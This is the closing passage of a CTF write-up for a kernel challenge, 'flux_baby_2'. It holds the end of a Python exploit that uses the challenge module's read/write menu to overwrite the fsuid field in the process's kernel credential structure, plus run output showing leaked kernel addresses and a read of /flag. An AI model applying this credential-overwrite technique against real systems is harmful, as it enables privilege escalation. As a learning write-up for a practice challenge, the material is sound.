</span><span>addr = real_cred_ptr + </span><span style=color:#d08770>4 </span><span>+ </span><span style=color:#d08770>8</span><span>*</span><span style=color:#d08770>3 </span><span style=color:#65737e># 4 for usage, 8 for uid/gid, 8 for suig/sgid, 8 for euid,guid
</span><span>s.</span><span style=color:#bf616a>send</span><span>('</span><span style=color:#d08770>{:x}</span><span style=color:#96b5b4>\n</span><span>'.</span><span style=color:#bf616a>format</span><span>(addr).</span><span style=color:#bf616a>encode</span><span>('</span><span style=color:#a3be8c>utf-8</span><span>'))
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>></span><span>')
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>0</span><span style=color:#96b5b4>\n</span><span>')
</span><span>
</span><span style=color:#65737e># 4. Get userid
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>> </span><span>')
</span><span>s.</span><span style=color:#bf616a>send</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>3</span><span style=color:#96b5b4>\n</span><span>')
</span><span>s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\r\n</span><span>')
</span><span>userid = s.</span><span style=color:#bf616a>recv_until</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\r\n</span><span>')
</span><span style=color:#bf616a>plog</span><span>('</span><span style=color:#a3be8c>USER: </span><span style=color:#d08770>{}</span><span>'.</span><span style=color:#bf616a>format</span><span>(userid.</span><span style=color:#bf616a>strip</span><span>().</span><span style=color:#bf616a>decode</span><span>()))
</span><span>
</span><span style=color:#65737e># 5. Go interactive
</span><span style=color:#96b5b4>print</span><span>(s.</span><span style=color:#bf616a>recv_all</span><span>().</span><span style=color:#bf616a>decode</span><span>())
</span><span>s.</span><span style=color:#bf616a>interact</span><span>()
</span></code></pre><p>Let's run it:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>$ python solve.py
</span><span>[+] Extracting symbols information from the binary...
</span><span>[+] Found current_task: 0xffffffff8183a040
</span><span>[+] Found commit_creds: 0xffffffff81050c50
</span><span>[+] Found real_cred_offset: 0x3f8
</span><span>-------------------
</span><span>[+] Connecting to remote VM...
</span><span>[+] VM Started!
</span><span>[+] Found current_task pointer: 0xffff888003373480
</span><span>[+] Found real_cred pointer: 0xffff888003382480
</span><span>[+] USER: uid=1000(user) gid=1000(user) groups=1000(user)
</span><span>----- Menu -----
</span><span>1. Read
</span><span>2. Write
</span><span>3. Show me my uid
</span><span>4. Read file
</span><span>5. Any hintz?
</span><span>6. Bye!
</span><span>> 4
</span><span>4
</span><span>Which file are we trying to read?
</span><span>> /flag
</span><span>/flag
</span><span>Here are your 0x10 bytes contents:
</span><span>flag{fake_flag}
</span><span>
</span><span>----- Menu -----
</span><span>1. Read
</span><span>2. Write
</span><span>3. Show me my uid
</span><span>4. Read file
</span><span>5. Any hintz?
</span><span>6. Bye!
</span><span>> 6
</span><span>6
</span><span>flux_baby_2 closed
</span><span>Bye!
</span><span>ACPI: Preparing to enter system sleep state S5
</span><span>reboot: Power down
</span><span>*** Connection closed by remote host ***
</span></code></pre><p>Et voilà! Fun fact: as we only overwrite <code>fsuid</code>, when the <code>id</code> command is triggered, our <code>uid</code> and <code>gid</code> are still set to <code>user</code> (1000). However since we only want to access the file system, it is enough to read the file <code>/flag</code> and retrieve it.<h2 id=conclusion>Conclusion</h2><p>I'd like to thank the creator of the challenge, as it was a nice way to get back to kernel exploitation.</div></main><footer>2024 - Antide Petit aka <a href=https://xarkes.com>xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/>CC-BY-SA</a> - Made with ❤️</footer>